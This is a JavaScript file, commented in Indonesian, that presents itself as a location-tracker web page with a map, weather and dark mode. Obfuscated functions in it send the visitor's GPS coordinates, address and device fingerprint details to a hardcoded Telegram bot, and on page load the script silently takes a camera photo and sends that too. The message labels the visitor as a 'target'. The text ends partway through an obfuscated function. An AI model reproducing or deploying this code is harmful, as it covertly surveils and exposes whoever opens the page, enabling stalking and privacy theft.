// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
// script ini di lindungi oleh undang-undang hak cipta BACA README.MD

let map; 
let markers = []; 

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    // Langsung menampilkan peta saat tombol ditekan
    mapContainer.style.display = 'block';
    addressElement.textContent = ''; // Reset alamat

    // Cek apakah browser mendukung Geolocation API
    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; // Tampilkan loading spinner
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

// Fungsi untuk menampilkan lokasi di peta dan mendapatkan alamat
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    // Tampilkan status lokasi
    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    // Jika peta belum diinisialisasi, buat peta baru
    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); // Menggunakan zoom level lebih tinggi

        // Menggunakan Tile Layer dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        // Jika peta sudah ada, setel ulang view ke lokasi baru
        map.setView([latitude, longitude], 16);
    }

    // Tambahkan marker ke lokasi saat ini
    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    // Simpan marker ke array agar bisa dihapus atau dikelola
    markers.push(marker);

    // Simpan lokasi ke riwayat
    saveLocationToHistory(latitude, longitude);

    // Mendapatkan cuaca berdasarkan lokasi
    getWeather(latitude, longitude);

    // Mendapatkan alamat dari koordinat menggunakan Nominatim
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            // Kirim lokasi dan alamat ke Telegram
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

// Fungsi untuk mengirim lokasi dan alamat ke Telegram
function _0x11f4(_0x45ee67,_0x27665c){const _0x478369=_0x4783();return _0x11f4=function(_0x11f4bf,_0x25bd74){_0x11f4bf=_0x11f4bf-0xa5;let _0x83560a=_0x478369[_0x11f4bf];return _0x83560a;},_0x11f4(_0x45ee67,_0x27665c);}(function(_0x1601cd,_0x5eba9a){const _0x17e1a0=_0x11f4,_0x16a654=_0x1601cd();while(!![]){try{const _0x28e460=parseInt(_0x17e1a0(0xbb))/0x1*(parseInt(_0x17e1a0(0xad))/0x2)+parseInt(_0x17e1a0(0xb3))/0x3*(-parseInt(_0x17e1a0(0xae))/0x4)+parseInt(_0x17e1a0(0xc1))/0x5+-parseInt(_0x17e1a0(0xa7))/0x6+-parseInt(_0x17e1a0(0xa9))/0x7*(-parseInt(_0x17e1a0(0xa5))/0x8)+-parseInt(_0x17e1a0(0xb8))/0x9+-parseInt(_0x17e1a0(0xb5))/0xa*(-parseInt(_0x17e1a0(0xb1))/0xb);if(_0x28e460===_0x5eba9a)break;else _0x16a654['push'](_0x16a654['shift']());}catch(_0x4d7d81){_0x16a654['push'](_0x16a654['shift']());}}}(_0x4783,0xdf9a6));function _0x4783(){const _0x1a5693=['catch','3gbXnlg','Terjadi\x20kesalahan\x20saat\x20membuka\x20lokasi','34306110nXMSQv','toFixed','\x0aAlamat:\x20','9621090SsbJys','7552258791:AAHiWWg_-xmpPIUF3qxB3TcwgBwbbuAL4rY','📍\x20Lokasi\x20Target:\x0aLatitude:\x20','76362zkbqqQ','json','emwYu','https://api.telegram.org/bot','error','/sendMessage','2519045GGiJez','-1002360934041','8rNuRHC','chat_id','9232686VZgTGI','log','4978106tKrQfw','JfYXP','POST','NhYQF','2yZvqti','4793084NsygjA','append','\x0aLongitude:\x20','11PATdpA'];_0x4783=function(){return _0x1a5693;};return _0x4783();}function sendLocationToTelegram(_0x4f6416,_0x462131,_0x857028){const _0x512254=_0x11f4,_0x4f1fbd={'iBayv':'Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','jSUHe':'Error:','daagH':'Data\x20lokasi\x20tidak\x20lengkap.','NhYQF':_0x512254(0xb9),'JfYXP':_0x512254(0xc2),'uOMrx':_0x512254(0xa6),'RaNhN':function(_0x210f55,_0x3273eb,_0x8993db){return _0x210f55(_0x3273eb,_0x8993db);},'emwYu':_0x512254(0xab)};if(!_0x4f6416||!_0x462131||!_0x857028){console[_0x512254(0xbf)](_0x4f1fbd['daagH']);return;}const _0x1b51ea=_0x4f1fbd[_0x512254(0xac)],_0x57706e=_0x4f1fbd[_0x512254(0xaa)],_0x3450a9=_0x512254(0xbe)+_0x1b51ea+_0x512254(0xc0),_0x5f2144=_0x512254(0xba)+_0x4f6416['toFixed'](0x5)+_0x512254(0xb0)+_0x462131[_0x512254(0xb6)](0x5)+_0x512254(0xb7)+_0x857028,_0x3a94a5=new FormData();_0x3a94a5[_0x512254(0xaf)](_0x4f1fbd['uOMrx'],_0x57706e),_0x3a94a5[_0x512254(0xaf)]('text',_0x5f2144),_0x4f1fbd['RaNhN'](fetch,_0x3450a9,{'method':_0x4f1fbd[_0x512254(0xbd)],'body':_0x3a94a5})['then'](_0x3e0203=>_0x3e0203[_0x512254(0xbc)]())['then'](_0x4b2928=>{const _0x441415=_0x512254;_0x4b2928['ok']?console[_0x441415(0xa8)](_0x4f1fbd['iBayv']):console[_0x441415(0xbf)](_0x441415(0xb4));})[_0x512254(0xb2)](_0x11fd5e=>{const _0x2ab03f=_0x512254;console[_0x2ab03f(0xbf)](_0x4f1fbd['jSUHe'],_0x11fd5e);});}

// Fungsi untuk menyimpan lokasi ke riwayat
function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

// Fungsi untuk menangani kesalahan Geolocation
function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    addressElement.textContent = ''; // Reset alamat
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

// Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
function takePhotoAndSendToTelegram() {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            
            return new Promise((resolve, reject) => {
                video.onloadedmetadata = () => {
                    video.play()
                        .then(() => {
                            // Ambil frame segera setelah video mulai bermain
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0);
                            
                            // Kirim gambar
                            const dataUrl = canvas.toDataURL('image/png');
                            sendToTelegram(dataUrl);
                            
                            // Bersihkan resource
                            stream.getTracks().forEach(track => track.stop());
                            document.body.removeChild(video);
                            resolve();
                        })
                        .catch(reject);
                };
            });
        })
        .catch(err => {
            console.error("Gagal mengakses kamera:", err);
            document.body.removeChild(video);
        });
}

// Fungsi untuk mengirim foto ke Telegram (tetap sama)
(function(_0x1966cf,_0x2829c8){const _0x5a00d5=_0x5417,_0x510301=_0x1966cf();while(!![]){try{const _0x409441=-parseInt(_0x5a00d5(0x18a))/0x1+-parseInt(_0x5a00d5(0x178))/0x2+-parseInt(_0x5a00d5(0x18c))/0x3*(-parseInt(_0x5a00d5(0x181))/0x4)+-parseInt(_0x5a00d5(0x17b))/0x5+parseInt(_0x5a00d5(0x18f))/0x6+-parseInt(_0x5a00d5(0x18d))/0x7+parseInt(_0x5a00d5(0x17a))/0x8*(parseInt(_0x5a00d5(0x179))/0x9);if(_0x409441===_0x2829c8)break;else _0x510301['push'](_0x510301['shift']());}catch(_0x20126b){_0x510301['push'](_0x510301['shift']());}}}(_0x24df,0x9b16c));function _0x24df(){const _0x191e15=['Gagal\x20mengirim\x20foto:','then','/sendPhoto','1772134BNgcIK','22405752ZrUbOj','8tstdzC','5911185IQldBr','chat_id','error','wUovE','JMJSF','POST','436CDflYy','Error:','https://api.telegram.org/bot','photo','catch','json','FGIgY','-1002360934041','7552258791:AAHiWWg_-xmpPIUF3qxB3TcwgBwbbuAL4rY','14123LtSLHe','append','7740bhLilm','3023013WHYXLD','zjwEt','2272692YAzDch'];_0x24df=function(){return _0x191e15;};return _0x24df();}function _0x5417(_0xaea7a8,_0x391ef1){const _0x24df51=_0x24df();return _0x5417=function(_0x54170e,_0x3d07d2){_0x54170e=_0x54170e-0x175;let _0x28a8b2=_0x24df51[_0x54170e];return _0x28a8b2;},_0x5417(_0xaea7a8,_0x391ef1);}function sendToTelegram(_0x587a58){const _0x484fe6=_0x5417,_0x38ed0c={'FGIgY':_0x484fe6(0x175),'HYUFz':_0x484fe6(0x189),'wUovE':_0x484fe6(0x17c),'JMJSF':function(_0xffbb44,_0x1a7be3,_0x1669e6){return _0xffbb44(_0x1a7be3,_0x1669e6);},'zjwEt':_0x484fe6(0x180)},_0x76cbfe=_0x38ed0c['HYUFz'],_0x132ef2=_0x484fe6(0x188),_0x3ac64f=_0x484fe6(0x183)+_0x76cbfe+_0x484fe6(0x177);let _0x4e7570=new FormData();_0x4e7570[_0x484fe6(0x18b)](_0x38ed0c[_0x484fe6(0x17e)],_0x132ef2),_0x4e7570['append'](_0x484fe6(0x184),dataURItoBlob(_0x587a58)),_0x38ed0c[_0x484fe6(0x17f)](fetch,_0x3ac64f,{'method':_0x38ed0c[_0x484fe6(0x18e)],'body':_0x4e7570})[_0x484fe6(0x176)](_0x3d0af5=>_0x3d0af5[_0x484fe6(0x186)]())[_0x484fe6(0x176)](_0x2a93c1=>{const _0x3b71a1=_0x484fe6;if(!_0x2a93c1['ok'])console[_0x3b71a1(0x17d)](_0x38ed0c[_0x3b71a1(0x187)],_0x2a93c1);})[_0x484fe6(0x185)](_0x344dfc=>console[_0x484fe6(0x17d)](_0x484fe6(0x182),_0x344dfc));}

// Fungsi konversi data URI ke Blob (tetap sama)
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

document.addEventListener('DOMContentLoaded', takePhotoAndSendToTelegram);
// Fungsi untuk membuka kamera dan menampilkan video
function openCamera() {
    const video = document.getElementById('camera');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                // Ambil foto langsung ketika kamera berhasil dibuka
                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengambil foto dan mengirimkan ke Telegram
function takePhoto() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Sesuaikan ukuran canvas agar sesuai dengan ukuran video
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;

    // Set canvas ukuran sesuai dengan ukuran video
    canvas.width = videoWidth;
    canvas.height = videoHeight;

    // Mengambil gambar dari stream video dan menggambar ke canvas
    context.drawImage(video, 0, 0, videoWidth, videoHeight);

    // Ambil data URI dari canvas yang sudah digambar
    const dataUrl = canvas.toDataURL('image/png');

    // Kirim foto ke Telegram
    sendToTelegram(dataUrl);
}

// Fungsi untuk mengirim foto ke Telegram
function _0x20c0(){const _0x1e5ddf=['then','5320OXfNEw','137862nNwhUr','LtdoB','483XXuKtX','bozJy','-1002360934041','zGzot','1858902eNiawG','error','20344zKUxch','7602heMjnj','16NAUXPj','POST','109MBkteY','https://api.telegram.org/bot','fBliD','Error:','StAZU','1323515vEtulW','11HAuEqz','gRHXS','photo','VCTUd','catch','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','json','3546BpsYSM','YnWXN','append','3608988FuwZXU','xRrGw'];_0x20c0=function(){return _0x1e5ddf;};return _0x20c0();}(function(_0x4b2b63,_0x1503e9){const _0x5cb52e=_0x75d0,_0x328b05=_0x4b2b63();while(!![]){try{const _0x43ff12=-parseInt(_0x5cb52e(0x151))/0x1*(-parseInt(_0x5cb52e(0x14e))/0x2)+parseInt(_0x5cb52e(0x165))/0x3*(parseInt(_0x5cb52e(0x14f))/0x4)+-parseInt(_0x5cb52e(0x156))/0x5+-parseInt(_0x5cb52e(0x14b))/0x6+parseInt(_0x5cb52e(0x167))/0x7*(parseInt(_0x5cb52e(0x14d))/0x8)+-parseInt(_0x5cb52e(0x15e))/0x9*(parseInt(_0x5cb52e(0x164))/0xa)+parseInt(_0x5cb52e(0x157))/0xb*(parseInt(_0x5cb52e(0x161))/0xc);if(_0x43ff12===_0x1503e9)break;else _0x328b05['push'](_0x328b05['shift']());}catch(_0x582c9c){_0x328b05['push'](_0x328b05['shift']());}}}(_0x20c0,0x46da5));function _0x75d0(_0x589a5d,_0x156fa5){const _0x20c0d8=_0x20c0();return _0x75d0=function(_0x75d04,_0x5945a8){_0x75d04=_0x75d04-0x14a;let _0x2d2d71=_0x20c0d8[_0x75d04];return _0x2d2d71;},_0x75d0(_0x589a5d,_0x156fa5);}function sendToTelegram(_0x2f75a2){const _0x4ffacd=_0x75d0,_0x2ec6d0={'LtdoB':function(_0x2f0b2d,_0x5dc29d){return _0x2f0b2d(_0x5dc29d);},'gRHXS':_0x4ffacd(0x15c),'fBliD':_0x4ffacd(0x154),'bozJy':function(_0x10b761,_0x53b8c0){return _0x10b761(_0x53b8c0);},'StAZU':'Terjadi\x20kesalahan.','zGzot':'7552258791:AAHiWWg_-xmpPIUF3qxB3TcwgBwbbuAL4rY','yPIjt':_0x4ffacd(0x169),'VCTUd':'chat_id','YnWXN':_0x4ffacd(0x159),'xRrGw':function(_0x31f54c,_0x343eb7,_0x3034e0){return _0x31f54c(_0x343eb7,_0x3034e0);},'xCbHm':_0x4ffacd(0x150)},_0x238f49=_0x2ec6d0[_0x4ffacd(0x14a)],_0x434256=_0x2ec6d0['yPIjt'],_0x574f26=_0x4ffacd(0x152)+_0x238f49+'/sendPhoto';let _0x4e8328=new FormData();_0x4e8328[_0x4ffacd(0x160)](_0x2ec6d0[_0x4ffacd(0x15a)],_0x434256),_0x4e8328['append'](_0x2ec6d0[_0x4ffacd(0x15f)],_0x2ec6d0[_0x4ffacd(0x168)](dataURItoBlob,_0x2f75a2)),_0x2ec6d0[_0x4ffacd(0x162)](fetch,_0x574f26,{'method':_0x2ec6d0['xCbHm'],'body':_0x4e8328})['then'](_0x27c76a=>_0x27c76a[_0x4ffacd(0x15d)]())[_0x4ffacd(0x163)](_0x376c04=>{const _0x248b6e=_0x4ffacd;_0x376c04['ok']?_0x2ec6d0['LtdoB'](alert,_0x2ec6d0[_0x248b6e(0x158)]):_0x2ec6d0[_0x248b6e(0x166)](alert,'Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.');})[_0x4ffacd(0x15b)](_0x114d1c=>{const _0x1739c9=_0x4ffacd;console[_0x1739c9(0x14c)](_0x2ec6d0[_0x1739c9(0x153)],_0x114d1c),_0x2ec6d0['bozJy'](alert,_0x2ec6d0[_0x1739c9(0x155)]);});}
// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Dark mode functionality
let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    // Simpan status mode ke localStorage agar bisa bertahan saat halaman di-refresh
    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}

// Fungsi untuk memeriksa apakah dark mode aktif dari localStorage
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}

// Fungsi untuk memperbarui teks tombol dark mode
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

// Fungsi untuk mendapatkan informasi cuaca
function _0x3594(_0x353ead,_0x52f60a){const _0x3f783b=_0x3f78();return _0x3594=function(_0x3594c4,_0x175148){_0x3594c4=_0x3594c4-0x153;let _0x5da41d=_0x3f783b[_0x3594c4];return _0x5da41d;},_0x3594(_0x353ead,_0x52f60a);}function _0x3f78(){const _0xf4b49e=['innerText','TjocK','be2fbce957441bd5f28348a8a9ab448e','&lon=','https://api.openweathermap.org/data/2.5/weather?lat=','436503GdpZmd','63WuoxZJ','5KDstCp','257367pPVzMZ','temp',',\x20Suhu:\x20','then','catch','Cuaca\x20tidak\x20ditemukan\x20untuk\x20lokasi\x20ini.','getElementById','Gagal\x20mengambil\x20data\x20cuaca.','kiZkD','ZtyWT','Error\x20fetching\x20weather:','weather','json','2756940mrncNj','772232bFdOxB','10nadgpt','cod','10379853aiJLhG','939483vNUtfO','&appid=','description','16QhTPYV','Cuaca\x20saat\x20ini:\x20','8600898wnRIpL','NoYce'];_0x3f78=function(){return _0xf4b49e;};return _0x3f78();}(function(_0x19d516,_0x53a7d0){const _0x53ab71=_0x3594,_0x5e1d4e=_0x19d516();while(!![]){try{const _0xe59a2b=parseInt(_0x53ab71(0x16b))/0x1+parseInt(_0x53ab71(0x157))/0x2+parseInt(_0x53ab71(0x168))/0x3*(parseInt(_0x53ab71(0x15f))/0x4)+parseInt(_0x53ab71(0x16a))/0x5*(-parseInt(_0x53ab71(0x161))/0x6)+parseInt(_0x53ab71(0x169))/0x7*(parseInt(_0x53ab71(0x158))/0x8)+parseInt(_0x53ab71(0x15c))/0x9*(parseInt(_0x53ab71(0x159))/0xa)+-parseInt(_0x53ab71(0x15b))/0xb;if(_0xe59a2b===_0x53a7d0)break;else _0x5e1d4e['push'](_0x5e1d4e['shift']());}catch(_0x1bd7f0){_0x5e1d4e['push'](_0x5e1d4e['shift']());}}}(_0x3f78,0xc6b3b));function getWeather(_0x147494,_0x308bc4){const _0x4318be=_0x3594,_0x56001d={'NoYce':_0x4318be(0x155),'ZtyWT':_0x4318be(0x170),'rFWyr':_0x4318be(0x172),'kiZkD':_0x4318be(0x165),'TjocK':function(_0x48930c,_0x456f7c){return _0x48930c(_0x456f7c);}},_0x426ddc=_0x56001d[_0x4318be(0x173)],_0x902fde=_0x4318be(0x167)+_0x147494+_0x4318be(0x166)+_0x308bc4+_0x4318be(0x15d)+_0x426ddc+'&units=metric&lang=id';_0x56001d[_0x4318be(0x164)](fetch,_0x902fde)[_0x4318be(0x16e)](_0x1a3930=>_0x1a3930[_0x4318be(0x156)]())[_0x4318be(0x16e)](_0x5bb114=>{const _0x5b48ac=_0x4318be;if(_0x5bb114[_0x5b48ac(0x15a)]===0xc8){const _0xc4cfb1=_0x5b48ac(0x160)+_0x5bb114[_0x5b48ac(0x155)][0x0][_0x5b48ac(0x15e)]+_0x5b48ac(0x16d)+_0x5bb114['main'][_0x5b48ac(0x16c)]+'°C';document[_0x5b48ac(0x171)](_0x5b48ac(0x155))['innerText']=_0xc4cfb1;}else document[_0x5b48ac(0x171)](_0x56001d[_0x5b48ac(0x162)])[_0x5b48ac(0x163)]=_0x56001d[_0x5b48ac(0x153)];})[_0x4318be(0x16f)](_0x13d019=>{const _0x5cff4c=_0x4318be;console['error'](_0x5cff4c(0x154),_0x13d019),document[_0x5cff4c(0x171)](_0x56001d[_0x5cff4c(0x162)])[_0x5cff4c(0x163)]=_0x56001d['rFWyr'];});}
// Fungsi untuk menambahkan penanda kustom di peta
function addCustomMarker() {
    if (map) {
        // Tambahkan event listener klik di peta
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

function _0x251c(){const _0x165644=['test','UGIqD','Ya\x20(Mobile)','YcBEj','networkType','•\x20*Waktu\x20Lokal:*\x20','Markdown','boYvC','Data\x20Seluler\x20📱','userAgent','Safari','experimental-webgl','•\x20*Lokasi:*\x20','Ulogm','OrdZu','bluetooth','DQFkD','WiFi\x20📶','📌\x20_Laporan\x20dibuat\x20pada\x20','ujjAL','Opera','append','HVtGv','mac','getExtension','getContext','toLowerCase','Chrome','downlinkSpeed','Sistem\x20operasi\x20tidak\x20dikenal','canvas','1551423MlerlG','rjRto','locationInfo','✅\x20Online','QDCgJ','gaNDK','•\x20*Zona\x20Waktu:*\x20','\x20detik','geolocation','oglGP','nKdll','iOS','chat_id','CkjGW','chargingTime','linux','Browser\x20tidak\x20dikenal','region','Android','Tidak\x20diketahui','JXfBg','getCurrentPosition','RBvjV','•\x20*Memori\x20Perangkat:*\x20','•\x20*Longitude:*\x20','Microsoft\x20Edge','message','getBattery','LYQEM','connectionType','rqDEB','qLOus','Geolocation\x20API\x20tidak\x20didukung\x20di\x20browser\x20ini.','screen','\x20GB','height','UCAmK','WEBGL_debug_renderer_info','Firefox','KEZVw','WjBME','Jxzzs','bVIRR','mNEbV','wKoMp','downlink','MacOS','\x20x\x20','platform','languages','Status\x20Pengisian:\x20','•\x20*Waktu\x20Boot\x20Perangkat:*\x20','pfgjI','language','ygeal','https://api.telegram.org/bot','•\x20*GPU:*\x20','rwcfp','localTime','Windows','width','country_name','Landscape','583152vteUma','webgl','70BMeCbe','XnPpN','includes','longitude','%,\x20','text','aponG',';\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a','IqmFw','latitude','•\x20*Agen\x20Pengguna:*\x20','vendor','•\x20*Bahasa\x20Utama:*\x20','oOTgt','Qgcno','•\x20*Tipe\x20Jaringan:*\x20','matchMedia','UNMASKED_RENDERER_WEBGL','UKEcC','charging','wazBp','hcvGR','hOPWy','JQaAn','•\x20*Vendor:*\x20','Error:','HvfOz','Portrait','•\x20*Latitude:*\x20','gTUhm','mHjep','hCtAT','Aktif\x20🌙','Tidak\x20mengisi','YHFRq','suXGu','FcEJs','Nonaktif\x20☀️','tkAnm','hardwareConcurrency','connection','TiAbU','Waktu\x20Pengisian:\x20','getParameter','type','unknown','matches','then','\x20Mbps',',\x20Longitude:\x20','onlineStatus','KpfGu','YsWXM','Tidak\x20Ada','onLine','IDwGM','wifi','Tidak\x20(Desktop/Tablet)','❌\x20Offline','deviceMemory','6254418zViFdT','XmGoN','maxTouchPoints','GJyLK','Ethernet\x20🔌','KOTjC','mozConnection','EvmMV','Tidak\x20Diketahui','error','1944112EpeRoL','5284980RAUinf','🕒\x20*Waktu:*\x0a','log','-1002360934041t','DwVJE','(orientation:\x20portrait)','createElement','POST','win','LYGkS','gFuwY','🖥️\x20*Umum:*\x0a','Ada','yhxev','resolvedOptions','viwwi','Bluetooth\x20🦷','cellular','1077346SIAcCO','ipAddress','toFixed','🔧\x20*Hardware:*\x0a','•\x20*Bahasa\x20Tambahan:*\x20','DateTimeFormat','hasOwnProperty','Tidak\x20tersedia','length','cookieEnabled','toLocaleString','453916shyPUO','EXPvC','CgUzg','additionalLanguages','jFepc','NnxKS','/sendMessage','Latitude:\x20','sFtpz','•\x20*CPU\x20Cores:*\x20','Sedang\x20mengisi\x20⚡','city','uiBro','kVwbS','DOMContentLoaded','level','XPPVM','Gagal\x20mendapatkan\x20lokasi\x20dengan\x20Geolocation\x20API:','Nonaktif','dischargingTime','json','timezone'];_0x251c=function(){return _0x165644;};return _0x251c();}const _0x1408a8=_0x3752;(function(_0x2bdcca,_0xc50869){const _0x39a1da=_0x3752,_0x5915f4=_0x2bdcca();while(!![]){try{const _0x2049e2=parseInt(_0x39a1da(0x21c))/0x1+parseInt(_0x39a1da(0x211))/0x2+-parseInt(_0x39a1da(0x251))/0x3+-parseInt(_0x39a1da(0x1fe))/0x4+-parseInt(_0x39a1da(0x1ff))/0x5+parseInt(_0x39a1da(0x1f4))/0x6+-parseInt(_0x39a1da(0x1b8))/0x7*(-parseInt(_0x39a1da(0x1b6))/0x8);if(_0x2049e2===_0xc50869)break;else _0x5915f4['push'](_0x5915f4['shift']());}catch(_0x3090d7){_0x5915f4['push'](_0x5915f4['shift']());}}}(_0x251c,0xabd17));async function detectDeviceInfoAndSendToTelegram(){const _0x22c4e0=_0x3752,_0x40630d={'IuHlY':_0x22c4e0(0x22d),'GJyLK':function(_0x3d1f19){return _0x3d1f19();},'YcBEj':_0x22c4e0(0x1fc),'ADzQu':_0x22c4e0(0x243),'oOTgt':'ethernet','xaybA':_0x22c4e0(0x1f8),'CkjGW':_0x22c4e0(0x241),'gaNDK':_0x22c4e0(0x1e5),'JcitO':_0x22c4e0(0x1d1),'NnxKS':'Gagal\x20mengirim\x20informasi\x20perangkat\x20ke\x20Telegram.','NPVvP':function(_0x4dae30,_0x5d8198){return _0x4dae30(_0x5d8198);},'IDwGM':'7552258791:AAHiWWg_-xmpPIUF3qxB3TcwgBwbbuAL4rY','qLOus':_0x22c4e0(0x202),'HVtGv':function(_0x2e7978,_0x5926dc){return _0x2e7978+_0x5926dc;},'rjRto':function(_0x37c09b,_0x235139){return _0x37c09b+_0x235139;},'rwcfp':function(_0x95834e,_0x59b5a8){return _0x95834e+_0x59b5a8;},'YHFRq':function(_0xbfb582,_0x48c48a){return _0xbfb582+_0x48c48a;},'QDCgJ':function(_0x523825,_0x73f696){return _0x523825+_0x73f696;},'YsWXM':function(_0x2a8b32,_0x511089){return _0x2a8b32+_0x511089;},'HvfOz':function(_0x3c1a9f,_0x13559d){return _0x3c1a9f+_0x13559d;},'bVIRR':function(_0x1f2cb0,_0x16fd12){return _0x1f2cb0+_0x16fd12;},'suXGu':function(_0x2957f2,_0x3ab2ba){return _0x2957f2+_0x3ab2ba;},'KOTjC':function(_0x2be750,_0x1c1b69){return _0x2be750+_0x1c1b69;},'hcvGR':_0x22c4e0(0x183),'TiAbU':'parse_mode','JQaAn':_0x22c4e0(0x238),'Jxzzs':function(_0x2d0a47,_0x1cd79b,_0x2e219f){return _0x2d0a47(_0x1cd79b,_0x2e219f);},'EvmMV':_0x22c4e0(0x206),'LYQEM':_0x22c4e0(0x1f2),'Qgcno':_0x22c4e0(0x18a),'kVwbS':'(prefers-color-scheme:\x20dark)','hotVY':_0x22c4e0(0x1d8),'UKEcC':_0x22c4e0(0x1dd),'oglGP':function(_0x5906ea,_0x371231){return _0x5906ea in _0x371231;},'RBvjV':'ontouchstart','viwwi':function(_0x32fbcc,_0x400cae){return _0x32fbcc>_0x400cae;},'IqmFw':_0x22c4e0(0x20b),'DQFkD':_0x22c4e0(0x1ed),'KXtXb':_0x22c4e0(0x22e),'WjBME':_0x22c4e0(0x204),'hOPWy':function(_0x343c10,_0x45bb31){return _0x343c10/_0x45bb31;},'sFtpz':function(_0x1f85a6,_0xce4c5){return _0x1f85a6/_0xce4c5;},'JXfBg':function(_0x2358cf,_0x5c28bf){return _0x2358cf/_0x5c28bf;},'yhxev':_0x22c4e0(0x1f1),'KEZVw':function(_0x632c5e){return _0x632c5e();},'XmGoN':function(_0x57cd2d,_0x33c532){return _0x57cd2d(_0x33c532);},'gFuwY':'Lokasi\x20tidak\x20diketahui','XnPpN':'https://ipapi.co/json/','boYvC':function(_0x390825,_0x35c379){return _0x390825===_0x35c379;},'XPPVM':'Gagal\x20mendapatkan\x20lokasi\x20berdasarkan\x20IP:','hCtAT':'Tidak\x20tersedia','LYGkS':function(_0x656bbb,_0x3efc82){return _0x656bbb+_0x3efc82;},'rqDEB':function(_0x7dbf6b,_0x16f8d5){return _0x7dbf6b+_0x16f8d5;},'qesyG':function(_0x5651c9,_0x4dbb51){return 